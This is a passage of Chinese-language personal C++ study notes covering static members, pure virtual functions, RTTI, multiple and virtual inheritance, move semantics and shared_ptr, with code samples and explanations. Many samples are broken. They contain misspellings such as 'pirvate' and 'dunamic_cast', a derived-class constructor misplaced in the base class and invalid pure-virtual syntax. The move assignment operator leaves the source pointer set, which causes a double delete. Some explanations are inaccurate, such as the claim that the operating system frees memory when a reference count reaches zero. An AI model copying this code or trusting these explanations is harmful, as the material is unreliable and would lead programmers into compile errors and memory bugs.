<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">unsigned</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> Test::i=<span class="number">20</span>;<span class="comment">//必须在类外进行初始化</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    std::cout&lt;&lt;test.i&lt;&lt;std::endl;<span class="comment">//类对象调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**2.**静态成员变量的注意项：</p>
<p>(1) 静态成员变量必须在类外进行初始化，否则会报未定义的错误，不能用构造函数进行初始化。因为静态成员变量在静态变量区，只有一份，而且静态成员变量在编译期就要被创建，成员函数那都是运行期的事情了</p>
<p>**3.**静态成员函数的特点：静态成员函数就是为静态成员变量设计的，就是为了维持封装性。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="title">getI</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> i; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">unsigned</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> Test::i = <span class="number">20</span>;<span class="comment">//必须在类外进行初始化</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    std::cout &lt;&lt; Test::<span class="built_in">getI</span>() &lt;&lt; std::endl;<span class="comment">//类对象调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h2><p>**1.**纯虚函数介绍：</p>
<p>(1) 还是那个枪械射击的例子，基础的枪类有对应的对象吗？没有。它唯一的作用就是被子类继承。</p>
<p>(2) 基类的openfire函数实现过程有意义吗？没有。它就是用来被重写的。</p>
<p>(3) 所以纯虚函数的语法诞生了，只要将一个虚函数写为纯虚函数，那么该类将被认为无实际意义的类，无法产生对象。纯虚函数也不用去写实际部分。写了编译期也会自动忽略。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Spear</span><span class="comment">//父类</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    std::string name;</span><br><span class="line">    std::string icon;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FireSpear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_,<span class="type">int</span> i) <span class="built_in">Spear</span>(name_,icon_), <span class="built_in">i</span>(i)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span></span>=<span class="number">0</span><span class="comment">//变成纯虚函数，不需要实现，后边不用写，但是不能把虚构函数和虚构函数忽略</span></span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Spear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">pirvate:</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FireSpear</span> : <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;FireSpear::openfire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">(<span class="type">const</span> Spear* pSpear)</span><span class="comment">//加了virtual动态绑定</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pSpear-&gt;<span class="built_in">openFire</span>();</span><br><span class="line">    <span class="keyword">delete</span> pSpear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">openFire</span>(<span class="keyword">new</span> <span class="built_in">FireSpear</span>(<span class="string">&quot;acd&quot;</span>, <span class="string">&quot;sad&quot;</span>, <span class="number">10</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 总结：纯虚函数的特点就是语法简单，却经常使用，必会。</p>
<h2 id="RTTL"><a href="#RTTL" class="headerlink" title="RTTL"></a>RTTL</h2><p>**1.**RTTI介绍：</p>
<p>(1) RTTI（Run Time Type Identification）即通过运行时类型识别，程序能够通过基类的指针或引用来检查这些指针或引用所指向的对象的实际派生类。</p>
<p>(2) C++为了支持多态，C++的指针或引用的类型可能与它实际指向对象的类型不相同，这时就需要rtti去判断类的实际类型了，<strong>rtti是C++判断指针或引用实际类型的唯一方式。</strong></p>
<p> <strong>2.<strong>RTTI的使用场景：</strong>可能有很多人会疑惑RTTI的作用，所以单独拿出来说一下。</strong></p>
<p>(1) 异常处理：这是RTTI最主要的使用场景，具体作用在异常处理章节会详细讲解。</p>
<p>(2) IO操作：具体作用等到IO章节会详细讲解。</p>
<p>**3.**RTTI的使用方式：RTTI的使用过程就两个函数</p>
<p>(1) typeid函数：typeid函数返回的一个叫做type_info的结构体，该结构体包括了所指向对象的实际信息，其中name()函数就可以返回函数的真实名称。type_info结构体其他函数没什么用.</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">std::cout&lt;&lt;<span class="built_in">typeid</span>(*指针).<span class="built_in">name</span>()&lt;&lt;std::endl;</span><br></pre></td></tr></table></figure>

<p>(2) dynamic_cast函数：C++提供的将父类指针转化为子类指针的函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">FirSpear* pFirSpear=<span class="built_in">dunamic_cast</span>&lt;FireSpear*&gt;(pSpear);<span class="comment">//指针和引用可以，转化成功返回对应指针，不成功NONE</span></span><br></pre></td></tr></table></figure>

<p>重要写法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(std::<span class="built_in">string</span>(<span class="built_in">typeid</span>(*pSpear).<span class="built_in">name</span>())==<span class="string">&quot;class FirSpear&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    FirSpear* pFirSpear=<span class="built_in">dunamic_cast</span>&lt;FirSpear*&gt;(pSpear);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>1.RTTI的注意事项：</strong></p>
<p><strong>当使用typeid函数时，父类和子类必须有虚函数（父类有了虚函数，子类自然会有虚函数），否则类型判断会出错。</strong></p>
<p>RTTI总结：就是C++在运行阶段判断对象实际类型的唯一方式。</p>
<h2 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h2><p>多继承了解一下就可以了。</p>
<p>**1.**多继承的概念：就是一个类同时继承多个类，在内存上，该类对象前面依次为第一个继承的类，第二个继承的类，依次类推。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">#<span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base1</span>(<span class="type">int</span> base1I_) :<span class="built_in">base1I</span>(base1I_) &#123; std::cout &lt;&lt; <span class="string">&quot;Base1()&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> base1I;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base2</span>(<span class="type">int</span> base2I_) :<span class="built_in">base2I</span>(base2I_) &#123; std::cout &lt;&lt; <span class="string">&quot;Base2()&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> base2I;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dervied</span> : <span class="keyword">public</span> Base1, <span class="keyword">public</span> Base2</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Dervied</span>(<span class="type">int</span> base1I_, <span class="type">int</span> base2I_, <span class="type">int</span> i_) :<span class="built_in">Base1</span>(base1I_), <span class="built_in">Base2</span>(base2I_), <span class="built_in">i</span>(i_)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Derived&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Dervied <span class="title">dervied</span><span class="params">(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Base1</span>()</span><br><span class="line"><span class="built_in">Base2</span>()</span><br><span class="line">Derived<span class="comment">//优先调用子类的参数，但是如果调用父类们相同的参数，就会出错</span></span><br></pre></td></tr></table></figure>

<p>**2.**多继承的注意点：</p>
<p>(1) 多继承最需要注意的点就是重复继承的问题</p>
<p>(2) 多继承会使整个程序的设计更加复杂，平常不推荐使用。C++语言中用到多继承的地方主要就是借口模式。相较于C++，java直接取消了多继承的功能，添加了借口。</p>
<p><strong>3.<strong>多继承的总结：多</strong>继承这个语法虽然在某些情况下使代码写起来更加简洁，但会使程序更加复杂难懂，一般来说除了借口模式不推荐使用。</strong></p>
<h2 id="虚继承及其实现原理"><a href="#虚继承及其实现原理" class="headerlink" title="虚继承及其实现原理"></a>虚继承及其实现原理</h2><p>**1.**虚继承的概念：虚继承就是为了避免多重继承时产生的二义性问题。虚继承的问题用语言不好描述，但用代码非常简单。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TrueBase</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	std::string icon;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span> :  <span class="keyword">virtual</span> <span class="keyword">public</span> TrueBase<span class="comment">//虚继承</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base1</span>(<span class="type">int</span> base1I_) :<span class="built_in">base1I</span>(base1I_) &#123; std::cout &lt;&lt; <span class="string">&quot;Base1()&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">	<span class="type">int</span> base1I;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base2</span> : <span class="keyword">virtual</span> <span class="keyword">public</span> TrueBase<span class="comment">//虚继承</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base2</span>(<span class="type">int</span> base2I_) :<span class="built_in">base2I</span>(base2I_) &#123; std::cout &lt;&lt; <span class="string">&quot;Base2()&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">	<span class="type">int</span> base2I;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dervied</span> :<span class="keyword">virtual</span> <span class="keyword">public</span> Base1, <span class="keyword">virtual</span> <span class="keyword">public</span> Base2<span class="comment">//这里可加可不加，不太理解就加上</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Dervied</span>(<span class="type">int</span> base1I_, <span class="type">int</span> base2I_, <span class="type">int</span> i_) :<span class="built_in">Base1</span>(base1I_), <span class="built_in">Base2</span>(base2I_)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Derived&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Dervied <span class="title">derived</span><span class="params">(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	std::cout &lt;&lt; derived.i &lt;&lt; std::endl;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Base1()</span><br><span class="line">Base2()</span><br><span class="line">Derived</span><br><span class="line">100</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>**2.**虚继承的实现原理介绍：</p>
<p>(1) 使用了虚继承的类会有一个虚继承表，表中存放了父类所有成员变量相对于类的偏移地址。</p>
<p>(2) 按照刚才的代码，B1，B2类同时有一个虚继承表，当C类同时继承B1和B2类时，每继承一个就会用虚继承表进行比对，发现该变量在虚继承表中偏移地址相同，就只会继承一份。</p>
<p>**4.**虚继承的总结：这个语法就是典型的语法简单，但在游戏开发领域经常使用的语法，其它领域使用频率会低很多。</p>
<h2 id="移动构造函数与移动赋值运算符"><a href="#移动构造函数与移动赋值运算符" class="headerlink" title="(**)移动构造函数与移动赋值运算符"></a>(**)移动构造函数与移动赋值运算符</h2><p>**1.**对象移动的概念：</p>
<p>(1) 对一个体积比较大的类进行大量的拷贝操作是非常消耗性能的，因此C++11中加入了“对象移动”的操作</p>
<p>(2) 所谓的对象移动，其实就是把该对象占据的内存空间的访问权限转移给另一个对象。比如一块内存原本属于A，在进行“移动语义”后，这块内存就属于B了。</p>
<p> **2.**移动语义为什么可以提高程序运行效率。因为我们的各种操作经常会进行大量的“复制构造”，“赋值运算”操作。这两个操作非常耗费时间。移动构造是直接转移权限，这是不是就快多了。</p>
<p><strong>注意：在进行转移操作后，被转移的对象就不能继续使用了，所以对象移动一般都是对临时对象进行操作（因为临时对象很快就要销毁了）。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>() = <span class="keyword">default</span>;<span class="comment">//默认构造函数</span></span><br><span class="line">	<span class="built_in">Test</span>(<span class="type">const</span> Test&amp; test)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (test.str)</span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(test.str) + <span class="number">1</span>]();<span class="comment">//加1不能省略</span></span><br><span class="line">			<span class="built_in">strcpy_s</span>(str, <span class="built_in">strlen</span>(test.str) + <span class="number">1</span>, test.str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Test</span>(Test&amp;&amp; test)<span class="comment">//移动构造函数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (test.str)</span><br><span class="line">		&#123;</span><br><span class="line">			str = test.str;</span><br><span class="line">			test.str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Test&amp; <span class="keyword">operator</span>=(<span class="type">const</span> Test&amp; test)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span> == &amp;test)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (str) &#123;<span class="comment">//是否为空字符串</span></span><br><span class="line">			<span class="keyword">delete</span>[] str;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (test.str)</span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(test.str) + <span class="number">1</span>]();</span><br><span class="line">			<span class="built_in">strcpy_s</span>(str, <span class="built_in">strlen</span>(test.str) + <span class="number">1</span>, test.str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	Test&amp; <span class="keyword">operator</span> = (Test&amp;&amp; test)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span> == &amp;test)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (str) &#123;</span><br><span class="line">			<span class="keyword">delete</span>[] str;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (test.str)</span><br><span class="line">		&#123;</span><br><span class="line">			str = test.str;<span class="comment">//转移权限</span></span><br><span class="line">			test.str;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">char</span>* str = <span class="literal">nullptr</span>;<span class="comment">//规范写法</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">Test <span class="title">makeTest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Test t;</span><br><span class="line">	<span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Test t = <span class="built_in">makeTest</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 注意这里的右值引用不能是const的，因为你用右值引用函数参数就算为了让其绑定到一个右值上去的！就是说这个右值引用是一定要变的，但是你一旦加了const就没法改变该右值引用了。</p>
<p><strong>3.</strong> <strong>默认移动构造函数和默认移动赋值运算符</strong></p>
<p> 会默认生成移动构造函数和移动赋值运算符的条件：</p>
<p> <strong>只有一个类没有定义任何自己版本的拷贝操作（拷贝构造，拷贝赋值运算符），且类的每个非静态成员都可以移动，系统才能为我们合成。</strong></p>
<p> <strong>可以移动的意思就是可以就行移动构造，移动赋值。所有的基础类型都是可以移动的，有移动语义的类也是可以移动的。</strong></p>
<p>hhh,周五成功把part3结束，但是移动构造函数还是不太懂，要复习喽</p>
<h1 id="智能指针"><a href="#智能指针" class="headerlink" title="智能指针"></a>智能指针</h1><h2 id="智能指针概述"><a href="#智能指针概述" class="headerlink" title="智能指针概述"></a>智能指针概述</h2><p> <strong>1.</strong> 为什么要有智能指针：在Part2的第二节课已经讲过，直接使用new和delete运算符极其容易导致内存泄露，而且非常难以避免。于是人们发明了智能指针这种可以自动回收内存的工具。</p>
<p>  <strong>2.</strong> 智能指针一共就三种：普通的指针可以单独一个指针占用一块内存，也可以多个指针共享一块内存。</p>
<p>(1) 共享型智能指针：shared_ptr，同一块堆内存可以被多个shared_ptr共享。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* pi = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="function"><span class="type">int</span>* <span class="title">pi2</span><span class="params">(pi)</span></span>;<span class="comment">//pi2和pi共享一段内存</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(2) 独享型智能指针：unique_ptr，同一块堆内存只能被一个unique_ptr拥有。无法拷贝和制造</p>
<p>(3) 弱引用智能指针：weak_ptr，也是一种共享型智能指针，可以视为对共享型智能指针的一种补充</p>
<p> <strong>3.</strong> <strong>（*）智能指针注意事项：</strong></p>
<p><strong>智能指针和裸指针不要混用，接下来的几节课会反复强调这一点。</strong></p>
<h2 id="shared-ptr"><a href="#shared-ptr" class="headerlink" title="(*)shared_ptr"></a>(*)shared_ptr</h2><p><strong>1.shared_ptr的工作原理</strong> </p>
<p> (1)我们在动态分配内存时，堆上的内存必须通过栈上的内存来寻址。也就是说栈上的指针（堆上的指针也可以指向堆内存，但终究是要通过栈来寻址的）是寻找堆内存的唯一方式。<br> (2)所以我们可以给堆内存添加一个引用计数，有几个指针指向它，它的引用计数就是几，当引用计数为0时，操作系统会自动释放这块堆内存。<br> <strong>2.Shared_ptr的常用操作</strong> </p>
<p><strong>(1)shared_ptr的初始化</strong> </p>
<p> ①使用new运算符初始化， 一般来说不推荐使用new进行初始化，因为C++标准提供了专门创建shared_ptr的函数“make_shared”，该函数是经过优化的，效率更高。<br> ②使用make_shared函数进行初始化：  </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">sharedI2</span>(sharedI);<span class="comment">//允许多个智能指针指向同一块内存</span></span><br></pre></td></tr></table></figure>

<p>注意：千万不要用裸指针初始化shared_ptr，容易出现内存泄露的问题。</p>
<p> ③当然使用复制构造函数初始化也是没有问题的。<br> 代码演示:   </p>
<p>(2)shared_ptr的引用计数：  智能指针就是通过引用计数来判断释放堆内存时机的。<br>use_count()函数可以得到shared_ptr对象的引用计数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">use_count</span>() &lt;&lt; std::endl; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">shareI2</span>(sharedI); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">use_count</span>() &lt;&lt; std::endl; 	</span><br><span class="line">	shareI2.<span class="built_in">reset</span>(); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">use_count</span>() &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;<span class="comment">//结果输出121</span></span><br></pre></td></tr></table></figure>

<p><strong>3.智能指针可以像普通指针那样使用，”share_ptr”早已对各种操作进行了重载，就当它是普通指针就可以了.</strong> </p>
<p>**4.Shared_ptr的常用函数 **</p>
<p>(3)unique函数：判断该shared_ptr对象是否独占若独占，返回true。否则返回false。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">unique</span>() &lt;&lt; std::endl;<span class="comment">//独占返回1 	</span></span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">shareI2</span>(sharedI); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">unique</span>() &lt;&lt; std::endl;<span class="comment">//独占返回0 	</span></span><br><span class="line">	shareI2.<span class="built_in">reset</span>(); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">unique</span>() &lt;&lt; std::endl;<span class="comment">//返回1</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> (4)reset函数： </p>
<p>①当reset函数有参数时，改变此shared_ptr对象指向的内存。<br>②当reset函数无参数时，将此shared_ptr对象置空，也就是将对象内存的指针设置为nullptr。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">unique</span>() &lt;&lt; std::endl;	</span><br><span class="line">	sharedI.<span class="built_in">reset</span>(<span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">1000</span>));<span class="comment">//原有堆内存被释放，指向新的堆内存,写法不能写成shared_ptr的初始化</span></span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI2 = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">	sharedI = sharedI2;</span><br><span class="line">	sharedI.<span class="built_in">reset</span>();<span class="comment">//置为空</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(5)get函数，强烈不推荐使用</p>
<p>(6)swap函数：交换两个智能指针所指向的内存</p>
<p>①std命名空间中全局的swap函数 </p>
<p>②shared_ptr类提供的swap函数</p>
